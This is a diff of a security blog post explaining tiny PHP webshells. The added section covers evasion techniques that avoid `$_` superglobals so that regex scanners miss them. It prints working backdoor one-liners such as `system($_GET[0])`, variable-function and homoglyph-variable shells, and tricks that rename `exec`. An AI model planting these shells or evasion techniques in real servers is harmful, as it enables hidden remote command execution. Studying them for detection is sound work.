@@ -14,7 +14,7 @@ list($x, $x‍) = $_POST;
 $x($x‍);
 ```
 
-If no, please read further ...
+If no, please continue reading ...
 
 # Intro
 
@@ -68,7 +68,7 @@ No doubt that the second line has nothing to do there, and that someone who know
 One could identify three main strategies for such tiny payloads:
 * Having a webshell that calls an `exec`-like functions (`system`, `passthru`, `shell_exec` or the backtick operator, `proc_open`, `popen`, `pcntl_exec`), passing as argument a user-supplied input (e.g. `<?php system($_GET[0]); ?>`). Indeed, what an attacker generally wants is to execute bash commands ;
 * Having a webshell that calls `eval`-like functions, knowing that alternatives are made more difficult to exploit with PHP 8. This second solution makes the webshell even more versatile, but the drawback is that `eval` cannot be used as a variable function. Whereas it is possible to call `system` with something like `('sys'.'tem')/**/('id');`, doing so with `eval` would not work ([source: Variable functions](https://www.php.net/manual/en/functions.variable-functions.php)) ;
-* Having a webshell for which function names are dynamically resolved with variable functions, such as `<?php $_GET['a']($_GET['b']);`. This third solution is an in between since it does not hardcode the routine name, while still being a bit more restrictive than an `eval`.
+* Having a webshell for which function names are dynamically resolved with variable functions, such as `<?php $_GET['a']($_GET['b']); ?>`. This third solution is an in between since it does not hardcode the routine name, while still being a bit more restrictive than an `eval`.
 
 # The `extract` routine
 
@@ -166,6 +166,189 @@ named indexes must be used for the two `$x` variables (a real one and a look-ali
 
 <img width="100%" style="margin-left:auto;margin-right:auto;display:block;" alt="weird_shell3" src="/assets/res/stuff/weird_shell3.png">
 
+# Getting rid of `$_`
+
+The common way to pass data to PHP scripts is to send them as GET or POST parameters. Passing them as custom HTTP headers is also something quite common, to avoid payloads being logged. On the server side, passed parameters are generally retrieved with superglobals `$_GET` or `$_POST`, as shown in the tiny webshells with `list` and `extract`. The following superglobals are under the user's control, totally or partially:
+* `$_GET`: the parameters passed by the user in the URL ;
+* `$_POST`: the parameters passed by the user in the request body ;
+* `$_FILES`: uploaded files, populated even if no uploaded file is expected ;
+* `$_COOKIE`: submitted cookies ;
+* `$_SESSION`: normally not completely under the user's control (fortunately). It contains data related to the current user's session ;
+* `$_REQUEST`: merges `$_GET`, `$_POST` and `$_COOKIE` ;
+* `$_ENV`: associative array that contains variables passed to the current script via the environment method. It is not completely under the user's control, but they can still manipulate some entries, such as `$_ENV['REQUEST_URI']` ;
+* `$GLOBALS`: variables populated based on current user's session and HTTP request being sent. It contains the variables `_GET` or `_POST` ;
+* `$_SERVER`: similar to `$_ENV`, and it also contains some entries under the user's control.
+
+Although using superglobals is quite handy, spotting patterns like `extract($_POST)` or `list(...) = $_POST` can be done with a few regular expressions, hunting for `$_` or `$GLOBALS`. However, PHP is a permissive language, making it possible to recreate variables based on string manipulations, with [variable variables](https://www.php.net/manual/en/language.variables.variable.php):
+
+```php
+$x = '_'.'POST';
+echo $$x['param'];
+```
+
+The double-dollar sign would recreate the variable named `_POST`, giving in the end `$_POST["param"]`.
+
+_**Warning** Please note that variable variables cannot be used with PHP's Superglobal arrays within functions or class methods. The variable $this is also a special variable that cannot be referenced dynamically. That's what the doc says._
+
+Another way to write it could be as follows:
+
+```php
+$x = ${"_"."POST"}["param"];
+```
+
+However, we can do a bit better, by getting rid of the `$` sign. This is great because the constructions `$$` and `${` are a bit odd and can be spotted with regular expressions (note that the symbols can be separated by dummy comments like `$/*useless*/$x`).
+
+The following lines can also be used to retrieve data sent as POST parameters:
+
+```php
+echo filter_input(0, "param");
+echo file_get_contents("php://input");
+echo get_defined_vars()[array_keys(get_defined_vars())[1]]["param"];
+```
+
+Let's get more into details.
+
+## The routine `filter_input`
+
+As stated in the doc
+
+>```
+>filter_input — Gets a specific external variable by name and optionally filters it
+>
+>filter_input(
+>    int $type,
+>    string $var_name,
+>    int $filter = FILTER_DEFAULT,
+>    array|int $options = 0
+>): mixed
+>```
+
+
+The first argument (`$type`) is supposed to be one of **INPUT_GET**, **INPUT_POST**, **INPUT_COOKIE**, **INPUT_SERVER**, or **INPUT_ENV**. These values can, however, be translated into integers:
+
+* INPUT_GET: 1 ;
+* INPUT_POST: 0 ;
+* INPUT_COOKIE: 2 ;
+* INPUT_SERVER: 5 ;
+* INPUT_ENV: 4 ;
+
+_The 3 does not seem to be defined._
+
+The second argument is the same of the passed parameter, which means that `filter_input(0, "param");` would extract the value of the parameter `param` sent through POST.
+
+## The routine `file_get_contents`
+
+This routine can be used to read a data stream (e.g. file, URL), and is quite well known. The wrapper `php://input` is _a read-only stream that allows you to read raw data from the request body_ ([source](https://www.php.net/manual/en/wrappers.php.php)). Using it as an argument for `file_get_contents` is therefore an easy way to store the POST'ed data in a variable:
+
+```php
+$x = file_get_contents("php://input");
+var_dump($x);
+```
+
+If the POST'ed data contains _a=b&c=d_, this snippet of code would print:
+```
+string(7) "a=b&c=d"
+```
+
+Some manipulations still need to be done to separate the parameters.
+
+## The routine `get_defined_vars`
+
+As stated in the holy doc:
+
+>
+>This function returns a multidimensional array containing a list of all defined variables, be them environment, server or user-defined variables, within the scope that get_defined_vars() is called.
+>
+
+_I know there is a typo and that "be them environment" is wrong, but that is what is written._
+
+Even if no POST or GET parameter is sent, the returned multidimensional array would not be empty:
+
+```
+Array
+(
+    [_GET] => Array
+        (
+        )
+
+    [_POST] => Array
+        (
+        )
+
+    [_COOKIE] => Array
+        (
+        )
+
+    [_FILES] => Array
+        (
+        )
+
+)
+```
+
+Therefore, having such a request `curl -k https://targ.et/test.php?x=qwertz -d 'y=asdf'` would give something like:
+
+```
+Array
+(
+    [_GET] => Array
+        (
+            [x] => qwertz
+        )
+
+    [_POST] => Array
+        (
+            [y] => asdf
+        )
+
+    [_COOKIE] => Array
+        (
+        )
+
+    [_FILES] => Array
+        (
+        )
+
+)
+```
+
+To access each item without the string `_GET` or `_POST`, one could use the routine `array_keys`, which returns the list of the keys:
+
+```php
+print_r(array_keys(get_defined_vars()));
+```
+
+The result would be like:
+```
+Array
+(
+    [0] => _GET
+    [1] => _POST
+    [2] => _COOKIE
+    [3] => _FILES
+)
+```
+
+Therefore, retrieving the POST'ed data could be done as follows:
+
+```php
+get_defined_vars()[array_keys(get_defined_vars())[1]]; //all POST'ed data
+get_defined_vars()[array_keys(get_defined_vars())[1]]["param"]; //the parameter 'param'
+```
+
+Let's wrap it up in a single PHP script:
+
+<img width="100%" style="margin-left:auto;margin-right:auto;display:block;" alt="post_without_dollar" src="/assets/res/stuff/post_without_dollar.png">
+
+In the previous snippet, we use an additional evasion technique, masquerading `exec` as `trim`. Although the function already exists ([source](https://www.php.net/manual/en/function.trim)), it can be replaced in the current script.
+
+Let's trigger the command execution with `curl`:
+
+<img width="100%" style="margin-left:auto;margin-right:auto;display:block;" alt="post_without_dollar_exec" src="/assets/res/stuff/post_without_dollar_exec.png">
+
+_Not optimal because of multiline output_
+
+The five commands passed as _A_, _B_, _C_, _D_ and at the beginning of the POST'ed data are indeed passed to the `exec` routine, and successfully lead to commands execution. 
 
 # Sources:
 * [PHP Backdoors: Hidden With Clever Use of Extract Function](https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html)
